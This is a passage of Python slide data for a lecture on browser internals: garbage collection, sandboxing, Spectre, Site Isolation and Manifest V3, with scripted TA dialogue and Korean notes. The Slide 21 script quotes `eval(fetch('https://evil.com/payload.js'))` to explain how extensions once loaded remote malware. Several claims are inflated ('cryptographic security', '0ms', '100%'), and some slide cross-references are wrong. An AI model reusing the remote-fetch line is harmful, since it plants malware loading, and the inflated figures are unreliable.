        },
        "keyTerms": [
            {
                "term": "Generational Hypothesis",
                "def": "The empirical software property stating that newly allocated objects have a very high probability of becoming unreachable rapidly.",
                "defKo": "세대 가설 (단명 객체 법칙)"
            },
            {
                "term": "Object Promotion",
                "def": "The migration of surviving memory objects from young nursery spaces to the tenured old-generation heap.",
                "defKo": "객체 승격 (Promotion)"
            }
        ]
    },
    # Slide 14: Minor GC vs. Major GC
    {
        "num": 14,
        "type": "comparison",
        "title": "MINOR GC VS. MAJOR GC",
        "subtitle": "Comparing the ultra-fast Dual-Space Copying Scavenger with Mark-Sweep-Compact",
        "leftCard": {
            "tag": "MINOR GC (SCAVENGER)",
            "title": "Semi-Space Nursery",
            "points": [
                "Target: Young Generation (<64MB).",
                "Algorithm: Cheney's Dual-Space Copying.",
                "Latency: 0.5 - 2.0 milliseconds.",
                "Frequency: Hundreds of times per second."
            ]
        },
        "rightCard": {
            "tag": "MAJOR GC (FULL MARK)",
            "title": "Mark-Sweep-Compact",
            "points": [
                "Target: Old Generation (Up to 4GB).",
                "Algorithm: Tri-color Marking & Compacting.",
                "Latency: Concurrent & Incremental (0ms pause).",
                "Frequency: Once every few minutes."
            ]
        },
        "script": (
            "[TA Sarah] Slide 14 compares \"MINOR GC VS. MAJOR GC: The Cleaning Engines.\"\n\n"
            "[TA James] Look at the two algorithms: Minor GC uses Cheney's Semi-Space Copying: it splits young memory into 'From Space' and 'To Space'. It copies live pointers and wipes the rest in 1 millisecond flat!\n\n"
            "[Prof. Peter] Major GC manages the entire 4GB Old Generation using Tri-Color Marking and Compacting. In older browsers, Major GC caused painful 500ms screen freezes! But Orinoco runs concurrently on background helper threads, achieving near-zero UI jank!\n\n"
            "[TA Sarah] Let us inspect the Sandbox Principle and privilege separation on Slide 15."
        ),
        "koreanGuide": {
            "summary": "마이너 GC vs 메이저 GC 비교: 0.5ms 스캐빈저와 0ms 동시 마크-스윕-컴팩트",
            "points": [
                "마이너 GC (스캐빈저): From/To 세미 스페이스 복사 기법으로 신세대를 0.5~2ms 내에 청소",
                "메이저 GC (마크-스윕-컴팩트): 삼색 마킹(Tri-color Marking)을 백그라운드 헬퍼 스레드에서 점진적(Incremental) 실행",
                "과거 500ms 화면 멈춤(Jank) 현상을 오리노코 동시성 엔진으로 완전히 극복"
            ],
            "tips": "제임스 조교와 피터 교수가 백그라운드 스레드에서 UI 멈춤 없이 돌아가는 현대 GC의 우수성을 전달합니다."
        },
        "keyTerms": [
            {
                "term": "Tri-Color Marking",
                "def": "An incremental garbage collection algorithm categorizing objects as White (unvisited), Grey (visiting), or Black (retained).",
                "defKo": "삼색 마킹 알고리즘"
            },
            {
                "term": "UI Jank Elimination",
                "def": "Preventing dropped visual animation frames by executing memory compaction asynchronously on background threads.",
                "defKo": "UI 버벅임(Jank) 근절"
            }
        ]
    },
    # Slide 15: The Sandbox Principle: Caging Untrusted Code
    {
        "num": 15,
        "type": "content",
        "title": "THE SANDBOX PRINCIPLE: CAGING UNTRUSTED CODE",
        "subtitle": "Stripping OS kernel privileges from Renderer processes via seccomp-bpf and AppContainers",
        "points": [
            "The Caged Tiger: The renderer process can calculate math and draw pixels, but CANNOT access files, webcam, or network.",
            "Syscall Filtering (seccomp): Linux kernel blocks unauthorized system calls (`open()`, `fork()`, `exec()`).",
            "Mojo IPC Bridge: The renderer must send structured requests to the Browser Kernel to perform any real I/O."
        ],
        "script": (
            "[Prof. Peter] Slide 15 explains \"THE SANDBOX PRINCIPLE: CAGING UNTRUSTED CODE.\"\n\n"
            "[TA Sarah] Think of the renderer process like a dangerous caged tiger! It can jump and calculate math inside its glass cage, but it has zero access to your hard drive, zero access to your microphone, and zero access to raw network sockets!\n\n"
            "[TA James] Under Linux and Android, Chrome uses `seccomp-bpf` to block dangerous system calls like `exec()` or `open()`. If a hacked webpage tries to open `/etc/passwd`, the Linux kernel kills the process instantly!\n\n"
            "[Prof. Peter] All authorized communication must cross the Mojo IPC bridge to the Browser Kernel.\n\n"
            "[TA Sarah] Let us inspect Spectre and Meltdown on Slide 16."
        ),
        "koreanGuide": {
            "summary": "샌드박스 원칙: 유리 케이지에 갇힌 호랑이(렌더러)와 seccomp 시스템 콜 필터링",
            "points": [
                "유리 케이지 속 호랑이 비유: 렌더러 프로세스는 연산과 픽셀 렌더링만 가능하며 파일/웹캠/네트워크 직접 접근 불가",
                "seccomp-bpf 시스템 콜 차단: 리눅스/안드로이드 커널 레벨에서 open(), fork(), exec() 등 위험 시스템 콜 원천 차단",
                "Mojo IPC 중계: 모든 합법적 I/O 요청은 엄격한 검증을 거쳐 브라우저 커널 프로세스를 통해서만 수행"
            ],
            "tips": "사라 조교의 '유리 케이지 호랑이' 비유로 샌드박스 격리의 직관적 이미지를 심어주세요."
        },
        "keyTerms": [
            {
                "term": "seccomp-bpf Syscall Filter",
                "def": "A Linux kernel security facility restricting the system calls a process can issue, preventing privilege escalation.",
                "defKo": "seccomp-bpf 시스템 콜 필터"
            },
            {
                "term": "Mojo IPC",
                "def": "Chromium's high-performance inter-process communication system connecting sandboxed renderers to the browser kernel.",
                "defKo": "Mojo 프로세스 간 통신 (Mojo IPC)"
            }
        ]
    },
    # Slide 16: Spectre & Meltdown: Shattering Sandbox Walls
    {
        "num": 16,
        "type": "content",
        "title": "SPECTRE & MELTDOWN: SHATTERING SANDBOX WALLS",
        "subtitle": "How CPU branch prediction side-channels allowed JavaScript to read cross-origin memory across tabs",
        "points": [
            "The Hardware Flaw: Modern CPUs speculatively execute instructions ahead of time, leaving traces in L1/L3 cache.",
            "JavaScript Micro-Timers: Malicious JavaScript using `performance.now()` to measure cache access times down to nanoseconds.",
            "The Nightmare: A malicious tab on `evil.com` reading passwords and auth cookies from `bank.com` in the same process!"
        ],
        "script": (
            "[Prof. Peter] Slide 16 exposes the hardware crisis of modern computing: \"SPECTRE & MELTDOWN: SHATTERING SANDBOX WALLS.\"\n\n"
            "[TA Sarah] In 2018, researchers discovered a terrifying hardware flaw in all Intel, AMD, and ARM processors: CPUs speculatively guess which branch of code will execute, leaving tiny memory traces in the CPU cache!\n\n"
            "[TA James] Hackers wrote malicious JavaScript loops with high-resolution micro-timers (`performance.now()`). By measuring cache retrieval times in nanoseconds, a malicious tab could read passwords and session cookies from a banking tab running in the same memory space!\n\n"
            "[Prof. Peter] Software sandbox boundaries were shattered at the silicon level. How did Google fix it?\n\n"
            "[TA Sarah] Let us inspect Site Isolation on Slide 17!"
        ),
        "koreanGuide": {
            "summary": "스펙터(Spectre) & 멜트다운: CPU 하드웨어 결함과 자바스크립트 사이드 채널 탈취",
            "points": [
                "하드웨어 결함의 충격: 인텔, AMD, ARM CPU의 분기 예측(Branch Prediction)이 L1/L3 캐시에 남기는 흔적",
                "나노초 마이크로 타이머: performance.now()로 캐시 접근 시간을 측정하여 타 탭의 비밀번호를 복원",
                "동일 메모리 공유의 비극: evil.com 탭이 bank.com 탭의 세션 쿠키를 엿보는 하드웨어적 재앙"
            ],
            "tips": "제임스 조교와 사라 조교가 CPU 분기 예측 하드웨어 취약점이 브라우저를 뒤흔든 사건을 설명합니다."
        },
        "keyTerms": [
            {
                "term": "Spectre Side-Channel",
                "def": "A CPU architectural vulnerability allowing malicious code to read memory across security boundaries via speculative execution cache timings.",
                "defKo": "스펙터(Spectre) 사이드 채널 취약점"
            },
            {
                "term": "Speculative Execution",
                "def": "CPU hardware optimization predicting branch pathways and calculating instructions ahead of validation.",
                "defKo": "추측 실행 (Speculative Execution)"
            }
        ]
    },
    # Slide 17: Site Isolation: Process-Per-Site Defense
    {
        "num": 17,
        "type": "content",
        "title": "SITE ISOLATION: PROCESS-PER-SITE DEFENSE",
        "subtitle": "Assigning dedicated OS processes to every origin and rendering out-of-process iframes (OOPIF)",
        "points": [
            "Process-Per-Site Invariant: `bank.com` and `evil.com` NEVER share the same OS process or virtual address space.",
            "Out-of-Process Iframes (OOPIF): Embedded third-party ad iframes run in completely separate isolated processes.",
            "Hardware Protection: The CPU's Memory Management Unit (MMU) enforces physical hardware isolation between sites."
        ],
        "script": (
            "[TA Sarah] Slide 17 diagrams Chrome's masterpiece response: \"SITE ISOLATION: PROCESS-PER-SITE DEFENSE.\"\n\n"
            "[TA James] Google's answer to Spectre was radical: 'Never let two different websites share the same OS process!' Under Site Isolation, `bank.com` and `evil.com` are placed into completely separate operating system processes!\n\n"
            "[Prof. Peter] Even third-party ad iframes embedded inside a page are rendered as Out-of-Process Iframes (OOPIF)! If a malicious ad runs Spectre exploit code, it can only read its own process memory; the CPU's hardware Memory Management Unit (MMU) blocks it from touching your banking data!\n\n"
            "[TA Sarah] Let us examine the strategic trade-off: The 10% RAM Tax on Slide 18."
        ),
        "koreanGuide": {
            "summary": "사이트 격리(Site Isolation): 프로세스 분할과 Out-of-Process Iframes(OOPIF)",
            "points": [
                "사이트별 독립 프로세스 원칙: bank.com과 evil.com은 절대 동일한 OS 프로세스나 메모리 주소를 공유하지 않음",
                "OOPIF(Out-of-Process Iframes): 웹페이지 내에 삽입된 타사 광고 iframe조차 별도의 독립 프로세스로 분리 실행",
                "하드웨어 MMU 보호: CPU의 메모리 관리 장치(MMU)가 물리적으로 타 사이트 메모리 접근을 원천 차단"
            ],
            "tips": "사라 조교와 피터 교수가 MMU 하드웨어 레벨의 완벽한 격리 방어선을 해설합니다."
        },
        "keyTerms": [
            {
                "term": "Site Isolation",
                "def": "Chrome security feature ensuring pages from different websites are always isolated into distinct OS processes.",
                "defKo": "사이트 격리 (Site Isolation)"
            },
            {
                "term": "Out-of-Process Iframe (OOPIF)",
                "def": "Rendering cross-origin embedded frames inside their own dedicated sandboxed renderer process.",
                "defKo": "프로세스 분리형 iframe (OOPIF)"
            }
        ]
    },
    # Slide 18: The Strategic Trade-Off: The 10% RAM Tax
    {
        "num": 18,
        "type": "content",
        "title": "THE STRATEGIC TRADE-OFF: THE 10% RAM TAX",
        "subtitle": "Why Chrome willingly consumes 10-15% more memory to guarantee cryptographic security",
        "points": [
            "The Memory Cost: Spawning 40 separate processes requires duplicated V8 runtimes, Blink instances, and thread pools.",
            "The Deliberate Trade-Off: Trading 1GB of workstation RAM to eliminate cross-tab hardware data theft completely.",
            "Architectural Principle: Security and correctness must NEVER be sacrificed for superficial resource frugality."
        ],
        "script": (
            "[Prof. Peter] Slide 18 reflects on \"THE STRATEGIC TRADE-OFF: THE 10% RAM TAX.\"\n\n"
            "[TA Sarah] People constantly complain online: 'Why does Google Chrome use so much RAM?' Now you know the engineering truth!\n\n"
            "[TA James] Spawning 40 isolated processes means duplicating V8 instances and Blink runtimes. It costs about 10% to 15% more system RAM! But Chrome engineers made a conscious, deliberate choice: We will sacrifice 1 gigabyte of RAM to guarantee that no hacker can steal your bank passwords through CPU side channels!\n\n"
            "[Prof. Peter] True engineering wisdom chooses structural security over superficial resource savings.\n\n"
            "[TA Sarah] Let us inspect our second enterprise case study on Slide 22!"
        ),
        "koreanGuide": {
            "summary": "전략적 트레이드오프: 10% RAM 세금과 절대적 보안의 교환",
            "points": [
                "크롬이 RAM을 많이 먹는 이유: 40개 프로세스 분할로 인해 V8 런타임과 스레드 풀이 복제되기 때문",
                "의도된 전략적 결단: 1GB의 RAM을 지불하여 CPU 사이드 채널을 통한 금융 정보 탈취를 100% 원천 차단",
                "공학적 원칙: 표면적인 자원 절약을 위해 구조적 보안과 신뢰를 희생해서는 안 됨"
            ],
            "tips": "제임스 조교가 '크롬 램 돼지' 불평 뒤에 숨은 강력한 보안 결단을 통쾌하게 밝혀줍니다."
        },
        "keyTerms": [
            {
                "term": "Memory-for-Security Trade-off",
                "def": "The deliberate engineering decision to allocate additional RAM to establish hardware process boundaries.",
                "defKo": "보안을 위한 메모리 지출 트레이드오프"
            },
            {
                "term": "Process Duplication Overhead",
                "def": "The baseline memory consumption incurred when spinning up multiple distinct rendering engine instances.",
                "defKo": "프로세스 복제 오버헤드"
            }
        ]
    },
    # Slide 19: Case Study 2: Stopping Extension Exfiltration via MV3 DNR
    {
        "num": 19,
        "type": "casestudy",
        "title": "CASE STUDY 2: STOPPING ROGUE EXTENSION THEFT",
        "subtitle": "Global Enterprise blocks rogue Chrome extension from stealing corporate OAuth tokens using Manifest V3 DNR",
        "company": "Silicon Valley Cloud Fintech Enterprise",
        "problem": "A popular color-picker browser extension was acquired by an offshore shell company, which pushed a silent update attempting to intercept all HTTP POST requests and exfiltrate employee OAuth tokens.",
        "solution": "Enterprise Chrome policy enforced Manifest V3: blocked background page execution and banned dynamic webRequest interception.",
        "impact": "Rogue extension's remote exfiltration code failed to execute; 100% of employee session tokens protected; zero corporate breaches.",
        "script": (
            "[Prof. Peter] Slide 19 presents \"CASE STUDY 2: STOPPING ROGUE EXTENSION THEFT VIA MANIFEST V3.\"\n\n"
            "[TA Sarah] A popular free Chrome extension with 500,000 users—a simple color picker—was secretly acquired by a malicious cybercrime syndicate. They pushed a silent update to intercept all web traffic, looking to steal corporate Slack and AWS tokens!\n\n"
            "[TA James] Under legacy Manifest V2, that extension could run a persistent background page and read every HTTP header using `webRequest`! But under Manifest V3, persistent background pages are BANNED, and dynamic interception is stripped!\n\n"
            "[Prof. Peter] The rogue extension could not execute its remote payload, and 100% of the fintech's employee tokens were protected! That demonstrates why Google enforced the Manifest V3 revolution.\n\n"
            "[TA Sarah] Now let us open Part 3 and master Manifest V3 on Slide 20!"
        ),
        "koreanGuide": {
            "summary": "케이스 스터디 2: 인수 합병 후 악성화된 확장 프로그램의 토큰 탈취 시도를 차단한 MV3",
            "points": [
                "문제 상황: 50만 명이 쓰던 유명 컬러 피커 확장이 인수된 후 직원의 슬랙 및 AWS 토큰 탈취 악성코드 은폐 배포",
                "솔루션: 엔터프라이즈 매니페스트 V3 정책 강제로 백그라운드 상주 및 webRequest 동적 가로채기 차단",
                "성과: 악성 원격 페이로드 실행 원천 차단, 전사 OAuth 토큰 100% 수호, 기업 데이터 유출 0건"
            ],
            "tips": "사라 조교와 제임스 조교가 확장 프로그램 인수 후 악성화되는 공급망 공격을 MV3가 어떻게 막았는지 설명합니다."
        },
        "keyTerms": [
            {
                "term": "Extension Supply-Chain Attack",
                "def": "The covert acquisition and weaponization of popular browser extensions to exfiltrate user credentials.",
                "defKo": "확장 프로그램 공급망 공격"
            },
            {
                "term": "Dynamic Code Ban (MV3)",
                "def": "Manifest V3's strict architectural prohibition against executing unreviewed remote scripts or eval() calls.",
                "defKo": "동적 원격 코드 실행 금지 (MV3)"
            }
        ],
        "instructor": "Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab"
    },
    # Slide 20: Part 3 Section Divider
    {
        "num": 20,
        "type": "section",
        "title": "PART 3: THE MANIFEST V3 EXTENSION REVOLUTION",
        "subtitle": "Ephemeral Service Workers, declarativeNetRequest (DNR), and the controversial suppression of uBlock Origin",
        "script": (
            "[TA Sarah] Look at Slide 20: \"PART 3: THE MANIFEST V3 EXTENSION REVOLUTION.\" Now we enter the heart of the modern web platform debate!\n\n"
            "[Prof. Peter] In 2024–2026, Google completed its migration from Manifest V2 to Manifest V3 across billions of Chrome browsers worldwide.\n\n"
            "[TA James] In Part 3, we analyze the architectural battle: Why did Google replace persistent background pages with Ephemeral Service Workers? Why did they replace `webRequest` with `declarativeNetRequest` (DNR)? And why did this break legendary ad-blockers like uBlock Origin?\n\n"
            "[TA Sarah] Let us inspect the anatomy of Manifest V2 security holes on Slide 21!"
        ),
        "koreanGuide": {
            "summary": "Part 3 섹션 전환: 매니페스트 V3 확장 프로그램 혁명과 광고 차단기 논쟁",
            "points": [
                "2024~2026년 구글의 전 세계 수십억 크롬 브라우저 대상 MV2 ➔ MV3 강제 전환 완결",
                "기술적 대전환: 상주 백그라운드 페이지 ➔ 단명 서비스 워커, webRequest ➔ declarativeNetRequest(DNR)",
                "전설적 광고 차단기 유블록 오리진(uBlock Origin)의 무력화와 구글의 광고 비즈니스 충돌 분석"
            ],
            "tips": "피터 교수가 플랫폼 보안과 상업적 이해관계의 충돌을 날카롭게 짚어주며 Part 3를 엽니다."
        },
        "keyTerms": [
            {
                "term": "Manifest V3 Migration",
                "def": "The industry-wide transition modernizing Chrome extensions for improved security, performance, and privacy.",
                "defKo": "매니페스트 V3 전면 전환"
            },
            {
                "term": "Declarative Net Request (DNR)",
                "def": "Chrome API where extensions declare filtering rules in advance, evaluated natively by the browser kernel.",
                "defKo": "선언적 네트워크 요청 API (DNR)"
            }
        ],
        "instructor": "Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab"
    },
    # Slide 21: The Manifest V2 Security Hole: Remote Code Execution
    {
        "num": 21,
        "type": "content",
        "title": "THE MANIFEST V2 SECURITY HOLE: REMOTE CODE",
        "subtitle": "How legacy extensions used `eval()` and persistent background pages to bypass Chrome Web Store reviews",
        "points": [
            "The `eval()` Vulnerability: Extensions passed benign Web Store audits, then downloaded malicious scripts from remote servers.",
            "Persistent Background Pages: 20 extensions running permanently in memory consumed 2GB of background RAM.",
            "Unrestricted `webRequest`: Extensions could inspect, read, and modify every single password and network packet in real-time."
        ],
        "script": (
            "[Prof. Peter] Slide 21 exposes \"THE MANIFEST V2 SECURITY HOLE: REMOTE CODE EXECUTION.\"\n\n"
            "[TA Sarah] Under Manifest V2, extensions had dangerous superpowers! A developer could submit an innocent weather extension to the Chrome Web Store. Once approved, the extension could call `eval(fetch('https://evil.com/payload.js'))` and download banking malware directly into the user's browser!\n\n"
            "[TA James] Furthermore, Manifest V2 extensions kept persistent background pages running 24/7—draining your laptop battery and intercepting every raw password packet using the blocking `webRequest` API!\n\n"
            "[Prof. Peter] Google had to close these catastrophic security holes.\n\n"
            "[TA Sarah] Let us inspect Manifest V3's 3 core mandates on Slide 22!"
        ),
        "koreanGuide": {
            "summary": "매니페스트 V2의 보안 구멍: eval()을 통한 원격 악성코드 다운로드와 메모리 상주",
            "points": [
                "eval()의 치명적 허점: 스토어 심사는 날씨 앱으로 통과한 뒤, 사용자 설치 후 외부 서버에서 악성 스크립트 실시간 다운로드",
                "상시 상주 백그라운드: 확장 20개가 백그라운드 메모리를 2GB씩 잠식하고 배터리 소모",
                "무제한 webRequest: 사용자가 타이핑하는 모든 비밀번호와 네트워크 패킷을 중간에서 가로챌 수 있던 구조"
            ],
            "tips": "사라 조교와 제임스 조교가 MV2가 왜 보안상 퇴출될 수밖에 없었는지 공학적 이유를 설명합니다."
        },
        "keyTerms": [
            {
                "term": "Remote Script Injection",
                "def": "The dynamic loading and execution of unverified JavaScript files from remote servers inside a browser extension.",
                "defKo": "원격 스크립트 동적 주입"
            },
            {
                "term": "Blocking WebRequest API",
                "def": "A legacy browser API allowing extensions to synchronously pause, inspect, and modify all outbound network traffic.",
                "defKo": "동기식 차단형 WebRequest API"
            }
        ]
    },
    # Slide 22: Background Pages vs. Ephemeral Service Workers
    {
        "num": 22,
        "type": "comparison",
        "title": "BACKGROUND PAGES VS. SERVICE WORKERS",
        "subtitle": "Comparing 24/7 memory consumption with event-driven ephemeral lifecycle termination",
        "leftCard": {
            "tag": "MANIFEST V2 (LEGACY)",
            "title": "Persistent Background Page",
            "points": [
                "Runs 24/7/365 in background memory.",
                "Consumes 100MB - 300MB RAM per extension.",
                "Access to full DOM and `window` globals.",
                "High battery drain on mobile and laptops."
            ]
        },
        "rightCard": {
            "tag": "MANIFEST V3 (2026)",
            "title": "Ephemeral Service Worker",
            "points": [
                "Event-driven; spawns only when triggered.",
                "Automatically terminated after 30 seconds idle.",
                "0MB RAM consumption when idle.",
                "No DOM access; uses explicit message passing."
            ]
        },
        "script": (
            "[TA Sarah] Slide 22 contrasts \"BACKGROUND PAGES VS. EPHEMERAL SERVICE WORKERS.\"\n\n"
            "[TA James] Look at the memory architecture: In MV2, an extension ran a full hidden web page 24 hours a day! If you had 15 extensions, you wasted 2GB of RAM on idle background pages! In MV3, extensions run Ephemeral Service Workers: they spawn in 5 milliseconds to handle an event, and the browser kills the process after 30 seconds of idle time!\n\n"
            "[Prof. Peter] Idle memory drops to absolute zero. That makes laptops faster and dramatically extends battery lifespan.\n\n"
            "[TA Sarah] Let us inspect network control: webRequest vs. declarativeNetRequest on Slide 23!"
        ),
        "koreanGuide": {
            "summary": "백그라운드 페이지 vs 단명 서비스 워커: 2GB 낭비에서 유휴 시 0MB로",
            "points": [
                "MV2 상시 상주: 보이지 않는 웹페이지가 24시간 돌며 15개 확장이 2GB RAM을 갉아먹음",
                "MV3 단명 서비스 워커: 이벤트 발생 시 5ms 만에 깨어나 처리하고 30초 유휴 시 프로세스 자동 종료",
                "유휴 메모리 0MB 달성: 노트북 배터리 수명 연장 및 백그라운드 오버헤드 영구 퇴출"
            ],
            "tips": "제임스 조교가 30초 유휴 후 자동 종료(Termination)되는 서비스 워커의 가벼움을 강조합니다."
        },
        "keyTerms": [
            {
                "term": "Ephemeral Service Worker",
                "def": "An event-driven script that runs in the background, executing tasks in response to events and terminating when idle.",
                "defKo": "단명 서비스 워커 (Ephemeral Service Worker)"
            },
            {
                "term": "Zero-Idle Memory Footprint",
                "def": "The state where inactive browser extensions consume zero operating system RAM until triggered by an explicit event.",
                "defKo": "유휴 시 무메모리 점유"
            }
        ]
    },
    # Slide 23: Network Control: webRequest vs. DNR
    {
        "num": 23,
        "type": "content",
        "title": "NETWORK CONTROL: WEBREQUEST VS. DECLARATIVENETREQUEST",
        "subtitle": "Shifting network filtering from JavaScript callbacks to the native browser C++ kernel",
        "points": [
            "Legacy `webRequest` (MV2): Every packet was sent to JavaScript extension code (slow, high latency, security risk).",
            "Modern `declarativeNetRequest` (DNR): Extension submits a JSON list of block rules; Chrome C++ kernel blocks packets natively.",
            "Zero JavaScript Overhead: Blocking happens at the native network stack before socket creation with 0ms latency."
        ],
        "script": (
            "[Prof. Peter] Slide 23 explains \"NETWORK CONTROL: WEBREQUEST VS. DECLARATIVENETREQUEST (DNR).\"\n\n"
            "[TA Sarah] Here is the technical core of the debate: In MV2, whenever your browser downloaded a network packet, it paused the network pipeline and asked the JavaScript extension: 'Should I allow this?' That caused latency and gave extensions the power to read every private URL!\n\n"
            "[TA James] In MV3, the extension cannot inspect packets directly! Instead, the extension submits a declarative JSON rule list: 'Block all requests to track.adserver.com.' Chrome's native C++ networking engine evaluates the rules directly at wire speed in zero milliseconds!\n\n"
            "[Prof. Peter] It is faster and more private. But why did this spark a global revolt among ad-blocker developers?\n\n"
            "[TA Sarah] Let us inspect the demise of uBlock Origin on Slide 24!"
        ),
        "koreanGuide": {
            "summary": "네트워크 통제권: webRequest vs declarativeNetRequest(DNR) 네이티브 가로채기",
            "points": [
                "과거 webRequest: 패킷마다 자바스크립트 확장에 콜백을 보내 확인하느라 속도가 느리고 개인정보 유출 위험",
                "현대 DNR (선언적 규칙): 확장은 금지 규칙 JSON만 브라우저에 제출하고, 크롬 C++ 코어가 초고속 네이티브 차단",
                "0ms 와이어 스피드 차단: 빠르고 안전하지만 광고 차단기의 실시간 동적 필터링을 제한하는 양날의 검"
            ],
            "tips": "사라 조교와 제임스 조교가 DNR이 가져온 속도 향상과 함께 발생한 한계를 짚어줍니다."
        },
        "keyTerms": [
            {
                "term": "Declarative Rule Evaluation",
                "def": "Evaluating network filter rules within the native browser engine rather than delegating decisions to user scripts.",
                "defKo": "선언적 규칙 네이티브 평가"
            },
            {
                "term": "Wire-Speed Packet Dropping",
                "def": "Discarding unwanted network connections at the transport layer before memory buffers or sockets are allocated.",
                "defKo": "와이어 스피드 패킷 드롭"
            }
        ]
    },
    # Slide 24: The Demise of uBlock Origin & Ad-Blocker Suppression
    {
        "num": 24,
        "type": "content",
        "title": "THE DEMISE OF UBLOCK ORIGIN & AD-BLOCKER SUPPRESSION",
        "subtitle": "How DNR rule caps (30,000 rules) and dynamic syntax bans disabled advanced cosmetic filtering",
        "points": [
            "The 300,000 Rule Filter Lists: Legendary ad-blockers like uBlock Origin use 300,000+ dynamic regex and cosmetic DOM rules.",
            "DNR Static Cap: Chrome capped static rules at 30,000 (later raised to 330,000 across all extensions combined).",
            "Cosmetic Script Injection Ban: Extensions can no longer dynamically inject procedural CSS to hide anti-adblock popups."
        ],
        "script": (
            "[TA Sarah] Slide 24 explores \"THE DEMISE OF UBLOCK ORIGIN & AD-BLOCKER SUPPRESSION.\"\n\n"
            "[TA James] Why did Raymond Hill, the creator of uBlock Origin, announce that full uBlock Origin cannot run on Manifest V3? Because power ad-blockers rely on dynamic regular expressions, custom procedural filters, and 300,000 live rules that adapt in real time to YouTube's anti-adblock scripts!\n\n"
            "[Prof. Peter] Under Manifest V3, dynamic code injection is banned, and rule lists must be pre-packaged into static JSON files! This severely cripples advanced ad-blocking, forcing users to settle for the weaker 'uBlock Origin Lite'!\n\n"
            "[TA Sarah] Let us examine Google's Dual Identity: Guardian vs. Ad Giant on Slide 25."
        ),
        "koreanGuide": {
            "summary": "유블록 오리진의 퇴출과 광고 차단기 억제 논쟁: DNR 룰 한계와 동적 스크립트 금지",
            "points": [
                "30만 개 동적 룰의 필요성: 유튜브 등의 실시간 광고 스크립트 우회를 위해 고난도 정규식과 동적 DOM 필터링 필수",
                "DNR의 정적 한계: 사전 패키징된 정적 JSON 규칙만 허용하고 동적 절차적 필터 주입을 원천 차단",
                "유블록 오리진 라이트(uBlock Origin Lite)로의 강등: 기능이 제한된 축소형 쉴드로 후퇴하게 된 배경"
            ],
            "tips": "제임스 조교가 유블록 오리진 개발자 레이먼드 힐(Raymond Hill)의 선언을 인용하며 기술적 한계를 설명합니다."
        },
        "keyTerms": [
            {
                "term": "Cosmetic DOM Filtering",
                "def": "Injecting procedural CSS rules dynamically to hide anti-adblock popups, video overlays, and banner containers.",
                "defKo": "동적 DOM 요소 은닉 필터링"
            },
            {
                "term": "Static Rule Constraint",
                "def": "The requirement that all network filtering patterns be pre-compiled into static JSON manifests prior to execution.",
                "defKo": "정적 규칙 선언 제약"
            }
        ]
    },
    # Slide 25: Google's Dual Identity: Guardian vs. Ad Giant
    {
        "num": 25,
        "type": "comparison",
        "title": "GOOGLE'S DUAL IDENTITY: GUARDIAN VS. AD GIANT",
        "subtitle": "Analyzing the inherent conflict of interest between browser security and advertising revenue",
        "leftCard": {
            "tag": "THE BROWSER GUARDIAN",
            "title": "Legitimate Security Mandate",
            "points": [
                "Protects 3 billion users from malicious extensions.",
                "Stops rogue extensions from stealing session cookies.",
                "Eliminates 2GB background memory drains.",
                "Valid, world-class engineering motivation."
            ]
        },
        "rightCard": {
            "tag": "THE ADVERTISING HEGEMON",
            "title": "Commercial Revenue Defense",
            "points": [
                "Google generates $250B+ annually from online advertising.",
                "Ad-blockers directly threaten YouTube and search revenue.",
                "Crippling ad-blockers protects Google's core cash flow.",
                "Severe antitrust and conflict-of-interest scrutiny."
            ]
        },
        "script": (
            "[Prof. Peter] Slide 25 analyzes \"GOOGLE'S DUAL IDENTITY: GUARDIAN VS. ADVERTISING GIANT.\"\n\n"
            "[TA Sarah] Look at the profound conflict of interest: On the left, Google is the Guardian of the Web—protecting 3 billion people from malware and memory leaks! Their security arguments for Manifest V3 are 100% technically valid.\n\n"
            "[TA James] But on the right, Google is an advertising titan generating 250 billion dollars a year from ads! Ad-blockers threaten YouTube's business model! By crippling dynamic ad-blockers under the banner of 'security', Google protects its bottom line!\n\n"
            "[Prof. Peter] As Intelligence Architects, we must recognize both truths: the legitimate security improvement AND the commercial platform hegemony.\n\n"
            "[TA Sarah] Let us inspect strategic alternatives: Firefox and Brave on Slide 26!"
        ),
        "koreanGuide": {
            "summary": "구글의 이중 정체성: 보안의 수호자 vs 2,500억 달러 광고 제국",
            "points": [
                "보안의 수호자(좌측): 30억 사용자를 악성 확장과 세션 탈취로부터 지키려는 정당하고 탁월한 공학적 조치",
                "광고 제국의 수호(우측): 연간 2,500억 달러 광고 매출과 유튜브 수익을 위협하는 광고 차단기를 무력화하려는 상업적 동기",
                "이중적 진실의 통찰: 보안 혁신이라는 명분 뒤에 숨은 독점 플랫폼의 상업적 지배력 간파"
            ],
            "tips": "피터 교수가 균형 잡힌 비판적 사고로 구글의 공학적 성취와 상업적 이해관계를 입체적으로 분석합니다."
        },
        "keyTerms": [
            {
                "term": "Platform Conflict of Interest",
                "def": "The structural contradiction when a platform vendor controls both the underlying runtime and the primary advertising market.",
                "defKo": "플랫폼 이해 상충 (이중 정체성)"
            },
            {
                "term": "Antitrust Platform Scrutiny",
                "def": "Regulatory investigation into whether operating system architectural changes unfairly disadvantage independent competitors.",
                "defKo": "독점 플랫폼 규제 조사"
            }
        ]
    },
    # Slide 26: Strategic Alternatives: Firefox & Brave
    {
        "num": 26,
        "type": "content",
        "title": "STRATEGIC ALTERNATIVES: FIREFOX & BRAVE",
        "subtitle": "Firefox's hybrid MV3 with webRequest support vs. Brave's native C++ ad-blocking engine",
        "points": [
            "Mozilla Firefox: Adopts MV3 Service Workers BUT keeps the blocking `webRequest` API for full uBlock Origin compatibility.",
            "Brave Browser: Bypasses extension APIs entirely by building Rust/C++ ad-blocking shields directly into the browser core.",
            "Architect's Arsenal: Using multi-browser strategies to maintain complete cognitive and developmental sovereignty."
        ],
        "script": (
            "[TA Sarah] Slide 26 highlights \"STRATEGIC ALTERNATIVES: FIREFOX'S REBEL PATH & BRAVE'S C++ SHIELDS.\"\n\n"
            "[TA James] Look at how independent browsers responded: Mozilla Firefox implemented Manifest V3, but refused to disable `webRequest`! On Firefox, full uBlock Origin continues to run with 100% power! Meanwhile, Brave Browser wrote its ad-blocking shields in native Rust and C++ directly inside the browser kernel—completely immune to extension API changes!\n\n"
            "[Prof. Peter] An Intelligence Architect never surrenders to a single vendor's monopoly. We deploy multi-browser strategies to preserve our freedom.\n\n"
            "[TA Sarah] Let us inspect our third enterprise case study on Slide 29!"
        ),
        "koreanGuide": {
